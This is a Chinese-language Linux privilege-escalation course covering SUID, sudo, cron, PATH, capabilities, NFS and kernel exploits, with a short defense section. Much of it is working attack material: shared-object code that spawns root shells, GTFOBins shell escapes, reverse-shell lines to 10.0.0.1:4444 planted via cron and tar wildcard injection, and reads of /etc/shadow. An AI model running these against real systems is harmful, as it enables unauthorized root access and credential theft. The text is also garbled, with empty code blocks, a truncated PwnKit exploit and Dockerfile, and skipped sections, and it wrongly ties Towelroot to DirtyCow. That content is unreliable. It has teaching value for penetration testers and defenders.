# 第 1 课 提权概论 + 系统枚举

## 1.1 什么是提权
### 1.1.1 定义
**提权（Privilege Escalation）**：在已经获得目标系统低权限账户后，通过各种技术手段**提升到更高权限**（通常是 root）的过程。

```plain
渗透流程：
Web shell / 反弹 shell
        ↓
   www-data / nobody (低权)
        ↓
        ↓  ← 这里就是"提权"
        ↓
   root 权限 (高权)
        ↓
   持久化 / 内网横向
```

### 1.1.2 为什么要提权
低权限账户能做的事有限：
```plain
┌─────────────────────────────────────────────────┐
│ www-data 能做的：                                │
│ - 读自己有权限的文件                              │
│ - 执行部分命令                                   │
│ - 不能改系统配置                                 │
│ - 不能读其他用户的私有文件                         │
│ - 不能装软件                                     │
│ - 不能看其他进程                                  │
│                                                 │
│ root 能做的：                                    │
│ - 一切                                          │
│ - 读任意文件（含 /etc/shadow）                    │
│ - 改密码、加用户                                  │
│ - 改防火墙、装软件                                │
│ - 抓密码 hash                                    │
│ - 持久化、清痕迹、横向移动                         │
└─────────────────────────────────────────────────┘
```

### 1.1.3 提权的两大方向
| 类型 | 含义 | 例子 |
| --- | --- | --- |
| 水平提权 | 普通用户 → 同级另一普通用户 | user1 → user2（拿 user2 私钥） |
| 垂直提权 | 普通用户 → root | www-data → root |

本课重点讲**垂直提权**（业内俗称"提权"）。

## 1.2 Linux 权限模型复习
### 1.2.1 UID / GID
每个用户有：
+ **UID**（User ID）：用户标识
    - `0` = root
    - `1-999` = 系统用户（www-data / nobody / mysql）
    - `1000+` = 普通用户
+ **GID**（Group ID）：主组标识
```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd | grep www-data
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# 用户名:密码占位:UID:GID:注释:家目录:Shell
```

### 1.2.2 文件权限
```plain
-rwsr-xr-x  1 root root  44440 Mar 14 10:00 /usr/bin/passwd
├─┤├─┤├─┤
 │  │  └─ other: --x
 │  └──── group: r-x
 └─────── owner: rws
            ↑ s 是 SUID（关键！）
```

权限位：
```plain
r = 4 = 读
w = 2 = 写
x = 1 = 执行
s = SUID（owner 位）/ SGID（group 位）
t = Sticky（other 位，仅 owner 能删）
```

### 1.2.3 特殊权限位
| 位 | 含义 | 例子 |
| --- | --- | --- |
| **SUID** | 执行时以**文件 owner**身份运行 | `/usr/bin/passwd`（owner=root） |
| **SGID** | 执行时以**文件 group**身份运行 | 部分共享目录 |
| **Sticky** | 目录下文件仅 owner 可删 | `/tmp` |

SUID 是 Linux 提权的**最大攻击面**之一，第 2 课详细讲。

### 1.2.4 关键文件
```plain
/etc/passwd       所有用户信息（含 UID/GID/Shell）
/etc/shadow       密码 hash（仅 root 可读）
/etc/sudoers      sudo 配置（仅 root 可读）
/etc/group        用户组
/etc/crontab      系统级 cron
/var/spool/cron/  用户级 cron
/home/*/.ssh/     SSH 私钥
/home/*/.bash_history   bash 历史
~/.aws/credentials      AWS 凭据
```

# 第 2 课 内核漏洞 + SUID/SGID
时长 60 分钟。内核漏洞是"核武器"，SUID 是"日常工具"。

## 2.1 内核漏洞提权原理
### 2.1.1 内核 vs 用户态
```plain
┌─────────────────────────────────────┐
│ 用户态 (User Space)                 │
│   - 普通进程                         │
│   - 无硬件访问权限                   │
│   - 通过 syscall 调用内核            │
└────────────┬────────────────────────┘
             │ syscall
             ▼
┌─────────────────────────────────────┐
│ 内核态 (Kernel Space)                │
│   - 内核（ring 0）                   │
│   - 完全控制硬件                     │
│   - 所有进程共享                     │
└─────────────────────────────────────┘
```

内核漏洞 = 让普通进程通过特定 syscall 触发内核 bug，执行任意代码（在内核态），从而获得 root。

### 2.1.2 内核漏洞特点
```plain
┌──────────────────────────────────────────┐
│ 1. 版本特定（精确到小版本号）                │
│ 2. 利用通常很复杂（涉及内存破坏）            │
│ 3. 失败可能导致系统崩溃（DoS）              │
│ 4. 但是一旦成功 = 直接 root                │
└──────────────────────────────────────────┘
```

## 2.2 经典 DirtyCow / DirtyPipe
### 2.2.1 DirtyCow（CVE-2016-5195）
**CVE-2016-5195 Dirty COW（脏牛）**：Linux 内核 race condition，可读改任意只读文件。
+ 影响范围：Linux 2.6.22 - 4.8.3（2007 - 2016，影响 9 年！）
+ 利用：覆盖 `/etc/passwd`，给当前用户加 root UID
+ 公开 EXP：[Dirty COW 官方 PoC](https://github.com/dirtycow/dirtycow.github.io)
```bash
gcc dirtyc0w.c -o dirtyc0w -pthread -lcrypt
./dirtyc0w
# 然后用 firefart 用户登录（密码也是 firefart），就是 root
```

### 2.2.2 DirtyPipe（CVE-2022-0847）
**CVE-2022-0847 Dirty Pipe**：pipe 缓冲区未初始化，可写任意只读文件。
+ 影响范围：Linux 5.8 - 5.16.10 / 5.15.24 / 5.10.101
+ 利用：覆盖 `/etc/passwd` 或覆盖 SUID 二进制
+ 公开 EXP：[https://github.com/blasty/CVE-2022-0847](https://github.com/blasty/CVE-2022-0847)
```bash
gcc dirty_pipe.c -o dirty_pipe
./dirty_pipe /etc/passwd 1 "${hash}"
su root   # 用注入的 root 账户
```

## 2.4 SUID/SGID 原理
### 2.4.1 SUID 详细解释
SUID（Set-owner User ID）：当一个二进制文件设置了 SUID，**任何用户执行该文件时都以 owner 的身份运行**。

最经典例子：`/usr/bin/passwd`

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root 59640 Mar 22 20:02 /usr/bin/passwd
#       ↑ s = SUID
```

 passwd 程序的 owner 是 root，但任何用户都要用 passwd 改自己的密码，而密码 hash 在 `/etc/shadow`（root 才能读写）。所以 passwd 必须以 root 身份运行。

### 2.4.2 SUID 的安全风险
```plain
如果某个 SUID 二进制 = root 所有 + 有功能漏洞
    ↓
攻击者利用漏洞 = 以 root 身份执行任意命令
    ↓
提权成功
```

### 2.4.3 查找 SUID 文件
```bash
# 找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 两者都找
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null

# 简化版
find / -perm -u=s -type f 2>/dev/null
```

输出示例：

```plain
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim   ← 这个不是默认的！
/home/user1/backup   ← 这个也不是！可能后门
```

**关注点**：找非默认的、自定义的 SUID 文件。

## 2.5 SUID 提权
### 2.5.1 GTFOBins
**GTFOBins**（[https://gtfobins.github.io）：列出](https://gtfobins.github.io）：列出) Unix 二进制的"非预期用法"，包括 SUID 提权、sudo 提权等。

例如搜 `find`：

```plain
SUID:
sudo install -m =xs $(which find) .

```

### 2.5.2 经典 SUID 提权二进制

```bash

```

### 2.5.3 自定义 SUID 程序利用
如果发现 `/home/user/backup` 是自定义 SUID root 程序，分析它：

```bash
# 1. 看类型
file /home/user/backup

# 2. strings 找关键字
strings /home/user/backup | grep -E "sh|system|exec"

# 3. ltrace / strace（如果可执行）
strace /home/user/backup 2>&1 | grep -E "exec|open"

# 4. 反编译（ghidra / IDA）
```

常见漏洞：

+ 调用 system() 拼接用户输入 → 命令注入
+ 调用 execve() 路径相对 → PATH 劫持（第 3 课）
+ 调用 popen() 调用其他命令 → 同上

## 2.6 共享库注入
### 2.6.1 LD_PRELOAD
如果一个 SUID 程序加载了共享库，可以注入恶意 .so 劫持函数。

但 SUID 程序通常会忽略 LD_PRELOAD（glibc 安全机制），所以这种攻击主要针对 sudo 启动的程序。

```bash
# /etc/sudoers:
# user1 ALL=(ALL) NOPASSWD: env_keep=LD_PRELOAD /usr/bin/find

# 攻击
cat > /tmp/shell.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

### 2.6.2 rpath
某些二进制自带 rpath（运行时库搜索路径）。如果该路径可写，可注入恶意 .so。

```bash
readelf -d /usr/local/bin/suid_program | grep RPATH
# 如果 RPATH 指向 /tmp/libs/ 且该目录 user 可写

# 注入
echo 'void __attribute__((constructor)) _init(){system("/bin/sh");}' > /tmp/evil.c
gcc -shared -fPIC -o /tmp/libs/evil.so /tmp/evil.c
/usr/local/bin/suid_program   # 触发
```

# 第 3 课 sudo / Cron / PATH / Capabilities
 时长 60 分钟。本课是日常渗透中**最常用**的提权方法。

## 3.1 sudo 配置与漏洞
### 3.1.1 sudo 原理
`sudo`（superuser do）：允许普通用户以其他用户身份（默认 root）执行命令，前提是 `/etc/sudoers` 授权。

```bash
# 查看自己的 sudo 权限
sudo -l

# 示例输出 1（无限制）
User user1 may run the following commands on this host:
    (ALL : ALL) ALL
# 完全提权：sudo su -

# 示例输出 2（仅部分命令）
User user1 may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
# 只能 sudo find，但 find 可被 GTFOBins 提权

# 示例输出 3（含通配）
User user1 may run the following commands on this host:
    (root) NOPASSWD: /bin/cp /tmp/* /etc/cron.d/
# 可往 cron 目录复制任意文件
```

### 3.1.2 sudoers 配置文件
```bash
cat /etc/sudoers
# 语法：
# 用户  主机=(运行身份) [NOPASSWD:] 命令

# 示例
root         ALL=(ALL:ALL) ALL
%admin       ALL=(ALL) ALL
%sudo        ALL=(ALL:ALL) ALL
user1        ALL=(root) NOPASSWD: /usr/bin/find

# include
#includedir /etc/sudoers.d
```

`/etc/sudoers.d/` 目录下文件也会被加载。

### 3.1.3 经典 sudo 提权 —— GTFOBins
任何能"执行任意命令"的二进制，sudo 它就 = root。

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim
sudo vim -c ':!/bin/sh'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# less
sudo less /etc/anything
# !sh

# man
sudo man man
# !sh

# tar
sudo tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# python
sudo python -c 'import os; os.system("/bin/sh")'

# perl
sudo perl -e 'exec "/bin/sh"'

# ruby
sudo ruby -e 'exec "/bin/sh"'

# env
sudo env /bin/sh

# cp
sudo cp /etc/passwd /tmp/; ... 修改 ...; sudo cp /tmp/passwd /etc/passwd

# wget
# 用 wget 的 --input-file 读任意文件
sudo wget --input-file=/etc/shadow
```

### 3.1.4 sudo 历史漏洞
#### CVE-2019-14287
如果 sudoers 配置 `(ALL, !root)` 意图"禁止 root"，但用 `sudo -u "#-1"` 绕过：

```bash
sudo -u "#-1" /bin/sh
# 直接 root
```

#### CVE-2019-18634
`sudo < 1.8.26` 的 `pwfeedback` 选项存在栈溢出：

```bash
sudo -S -l
# 输入超长密码触发
```

#### CVE-2021-3156 Baron Samedit
`sudo < 1.9.5p2` 命令行参数堆溢出：

```bash
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <id>
```

影响 10 年内的几乎所有 sudo 版本，**无需 sudo 权限**就能提权。

### 3.1.5 sudo 提权流程
```plain
1. sudo -l 看能执行什么
2. 如果是 GTFOBins 列出的二进制 → 直接提权
3. 如果是脚本/自定义程序 → 分析漏洞
4. 如果 sudo 版本旧 → 尝试历史 CVE
```

## 3.2 Cron 定时任务滥用
### 3.2.1 Cron 原理
**Cron**：Linux 定时任务调度，按时间规则执行命令。

```bash
# 系统级 cron
cat /etc/crontab

# 用户级 cron
ls /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*     # 通常不可读

# anacron（每日/每周执行）
cat /etc/anacrontab
```

示例 `/etc/crontab`：

```plain
# m h dom mon dow user  command
*/5 * * * * root  /opt/backup.sh
0  3 * * * root  /usr/local/bin/cleanup.sh
30 4 * * 7 root  tar -zcf /var/backups/home.tgz /home/
```

每 5 分钟以 root 身份执行 `/opt/backup.sh`。

### 3.2.2 Cron 提权思路
```plain
┌──────────────────────────────────────────────┐
│ 1. 脚本本身可写 → 改成反弹 shell              │
│ 2. 脚本调用的命令路径可写 → PATH 劫持         │
│ 3. 脚本调用通配符 → 通配符注入                │
│ 4. 脚本目录可写 → 替换脚本                    │
└──────────────────────────────────────────────┘
```

### 3.2.3 案例 1：脚本可写
```bash
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root ... /opt/backup.sh
# ↑ other 可写！

echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /opt/backup.sh
# 等下一次 cron 执行（5 分钟内）就拿到 root shell
```

### 3.2.4 案例 2：PATH 劫持
```bash
# 假设 /etc/crontab 中有：
# */5 * * * * root backup_data

# backup_data 内容：
# #!/bin/bash
# tar -czf /backup/$(date +%F).tar.gz /var/www
# ↑ 用的是 tar，没绝对路径

# 检查 PATH
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

# 攻击：在可写目录放一个 tar 后门
mkdir /tmp/pwn
cat > /tmp/pwn/tar <<EOF
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
EOF
chmod +x /tmp/pwn/tar

# 但 cron 的 PATH 是固定的，无法控制
# 除非 cron 任务里 export PATH，否则 PATH 劫持在 cron 场景有限
```

更准确的 PATH 劫持场景见 3.3 节。

### 3.2.5 用 pspy 找隐藏 cron
很多 cron 任务不在 `/etc/crontab` 而在 systemd timer 或脚本里。pspy 可以监控：

```bash
./pspy64
# 实时显示：
# 2024/01/01 12:00:00 CMD: UID=0  PID=1234  | /bin/sh -c /opt/backup.sh
```

发现 cron 后再去检查脚本是否有漏洞。

## 3.3 PATH 环境变量劫持
### 3.3.1 PATH 原理
PATH 环境变量决定 shell 在哪里找命令：

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 当你输入 ls，shell 会依次查找：
# /usr/local/sbin/ls (不存在)
# /usr/local/bin/ls (不存在)
# /usr/sbin/ls (不存在)
# /usr/bin/ls (存在) ← 执行这个
```

### 3.3.2 PATH 劫持原理
如果 SUID root 程序内部用 `system("ps")` 这样的相对路径调用，会按当前用户的 PATH 查找。

**攻击**：

```bash
# 准备
echo $PATH
# /usr/local/bin:...

# 自定义一个恶意 ps
echo '/bin/sh' > /tmp/ps
chmod +x /tmp/ps

# 把 /tmp 加到 PATH 最前面
export PATH=/tmp:$PATH

# 执行 SUID 程序
./suid_program
# 程序内部 system("ps") → 找 /tmp/ps → 执行 /bin/sh
# 由于程序是 SUID root，shell 是 root 的
```

### 3.3.3 PATH 劫持实战步骤
```bash
# 1. 找 SUID 程序
find / -perm -4000 -type f 2>/dev/null
# 假设发现 /usr/local/bin/suid_binary

# 2. 分析它调用的命令（用 strings）
strings /usr/local/bin/suid_binary | grep -E "^[a-z]+$"
# ps
# netstat
# whoami

# 3. 用 strace 确认（如果有权限）
strace -f /usr/local/bin/suid_binary 2>&1 | grep execve

# 4. 写一个同名后门
echo '/bin/bash -p' > /tmp/ps
chmod +x /tmp/ps

# 5. PATH 注入
export PATH=/tmp:$PATH

# 6. 执行
/usr/local/bin/suid_binary
```

## 3.4 Linux Capabilities 提权
### 3.4.1 Capabilities 是什么
传统 Linux 只有 root / 非 root 二分权限。**Capabilities** 把 root 权限拆成 40+ 个细分能力：

```plain
CAP_NET_RAW       使用原始套接字（ping、抓包）
CAP_NET_BIND_SERVICE  绑定 <1024 端口
CAP_SYS_ADMIN     系统管理（mount、chroot）
CAP_SYS_PTRACE    调试其他进程
CAP_DAC_OVERRIDE  绕过文件权限检查
CAP_SETUID        改 UID
CAP_KILL          发信号
...
```

### 3.4.2 查看文件的 capabilities
```bash
getcap -r / 2>/dev/null
# 输出：
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/ping = cap_net_raw+ep

# +ep 表示在 effective 和 permitted 集合中
```

### 3.4.3 Capabilities 提权案例
#### cap_setuid
```bash
# /usr/bin/python3.8 cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# 直接 root shell
```

#### cap_sys_admin
可以 mount / chroot / 加载内核模块等。

```bash
# 挂载磁盘读 /etc
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
```

#### cap_dac_read_search
绕过文件读权限：

```bash
# 直接读 /etc/shadow
cat /etc/shadow
```

### 3.4.4 Capabilities 提权清单
参考 GTFOBins 的 capabilities 章节。常用：

```plain
cap_setuid       → 改 UID，python/perl 一行提权
cap_sys_admin    → mount / chroot
cap_dac_read_search → 任意文件读
cap_net_raw      → 抓包 / ARP 欺骗
cap_sys_ptrace   → 注入其他进程
```

## 3.5 NFS no_root_squash
### 3.5.1 NFS 简介
**NFS**（Network File System）：Linux 网络文件系统，把远程目录挂载到本地。

```bash
cat /etc/exports
# 输出：
# /shared  *(rw,sync,no_root_squash)
```

### 3.5.2 no_root_squash 漏洞
**no_root_squash**：客户端以 root 身份访问 NFS 时，服务端**不**把 root 降级为匿名用户（默认会降级，叫 root_squash）。

**攻击流程**：

```bash
# 1. 攻击机（root）挂载 NFS
mkdir /tmp/nfs
mount target:/shared /tmp/nfs

# 2. 在挂载目录里复制一个 SUID bash
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# 由于 no_root_squash，SUID 在服务端也生效

# 3. 在目标机（低权限）执行
/shared/bash -p
# -p 不重置 effective UID
# 由于 SUID root，直接 root shell
```

## 3.6 通配符注入
### 3.6.1 原理
shell 通配符 `*` 展开时，会把当前目录文件名作为参数传给命令。如果文件名以 `-` 开头，会被当成命令行选项。

```bash
# 假设 cron 任务是：
# */5 * * * * root tar -czf /backup.tgz /var/www/*

# /var/www/ 下创建：
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > shell.sh

# 下次 cron 执行：
# tar -czf /backup.tgz /var/www/--checkpoint=1 /var/www/--checkpoint-action=... /var/www/shell.sh ...
# 实际命令变成：
# tar -czf /backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# → 触发 RCE
```

### 3.6.2 适合通配符注入的命令
```plain
tar     --checkpoint-action
chmod   --reference
chown   --reference
wget    --input-file
curl    -K
rsync   -e
find    -exec
```

### 3.6.3 chmod --reference 注入
```bash
# 假设 cron: */5 * * * * root chmod 600 /var/www/*.log

touch -- "--reference=/etc/shadow"
# 下次执行：chmod 600 /var/www/*.log /var/www/--reference=/etc/shadow
# → chmod 把 /etc/shadow 改成 600 模式（仍然 root 可读，但攻击者配合别的方法可读）
```

更危险的是 `--reference=attacker_file`，把任意文件权限改成与 attacker_file 相同。

### 4.2.1 Lab 01：PwnKit 内核漏洞（CVE-2021-4034）
**漏洞原理回顾**：polkit 的 pkexec（SUID root）存在内存损坏，普通用户调用即可拿 root。影响 Linux 几乎所有发行版 12 年。

**Dockerfile**（`lab01-pwnkit/Dockerfile`）：

```dockerfile

RUN sed -i 's/archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list && \

```

**启动**：


**确认漏洞版本**：

```bash
uname -r              # 5.11.0-... （任一内核都中招，因为是 polkit 漏洞）
```

**复现**：

```bash

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    system("gcc -shared -o /tmp/pwnkit.so -fPIC -nostartfiles -");
    /* 完整 EXP 见 https://github.com/berdav/CVE-2021-4034 */
    return 0;
}
EOF
```

## 4.4 防御方案
### 4.4.1 系统级防御
```plain
┌──────────────────────────────────────────────┐
│ 1. 内核及时升级                               │
│    - apt update && apt upgrade               │
│    - 关注 CVE 公告                            │
│                                              │
│ 2. 限制 SUID                                 │
│    - 移除非必要 SUID 二进制                    │
│    - chmod u-s /usr/bin/find                 │

│    - 避免 ALL=(ALL) ALL                      │
│                                              │
│ 4. Capabilities 收敛                         │
│    - 不轻易 setcap                           │
│    - 用 getcap 定期审计                       │
│                                              │
│ 5. Cron 文件权限                              │
```

### 4.4.2 Docker 安全
```plain
1. 不要用 --privileged
2. 用最小 capabilities
3. 不挂载 docker.sock 到容器
4. 用非 root 用户运行容器
5. 使用 read-only rootfs
6. 启用 seccomp / AppArmor
7. 镜像扫描（Trivy / Clair）
8. 不用 root Docker daemon
9. 用户不要加到 docker 组（用 rootless docker）
```

## 4.5 真实案例
### 4.5.1 DirtyCow 实战（2016）
```plain
事件：2016 年 10 月 DirtyCow 披露
影响：Linux 内核 9 年（2007-2016）
利用：数十万 Android 设备 root（root 工具厂商基于此漏洞）
案例：Android "Towelroot" 系列 root 工具
防御：及时更新内核，关闭 SSH 远程登录后检查完整性
```

### 4.5.2 PwnKit 全球性事件（2022）
```plain
事件：2022 年 1 月 PwnKit（CVE-2021-4034）公开
影响：所有 Linux 发行版 12 年（2009-2022）
利用：一条命令拿 root，极简单
案例：几乎所有企业都受影响，全员紧急打补丁
```

### 4.5.3 Tesla Kubernetes 集群被攻陷（2018）
```plain
事件：Tesla 内部 K8s 集群被黑客入侵
原因：K8s Dashboard 未授权（默认 30000 端口开放，无密码）
利用：通过 Dashboard 跑 Pod 挖矿 + 访问 AWS 元数据
教训：K8s 必须配置 RBAC，所有 API 加认证
```

### 4.5.4 Docker Hub 投毒（2019）
```plain
事件：Docker Hub 上多个流行镜像被植入挖矿/后门
利用：用户 pull 后运行，容器逃逸拿宿主机 root
防御：私有镜像仓库 + 镜像扫描 + 只拉 trusted publisher
```

### 4.5.5 Capital One（2019）
```plain
事件：1 亿用户数据泄露
提权链：
  - WAF SSRF → EC2 元数据 IAM 凭据
  - 凭据 → S3 bucket
  - 配置错误（ACL 过宽）→ 数据泄露
教训：云原生场景下"提权"包括跨服务授权
```

### 4.5.6 Codecov 供应链攻击（2021）
```plain
事件：Codecov bash 脚本被改，注入恶意代码
影响：大量 CI 环境凭据泄露
提权链：CI 容器 → 云服务凭据 → 云资源完全控制
教训：CI 容器也需最小权限
```
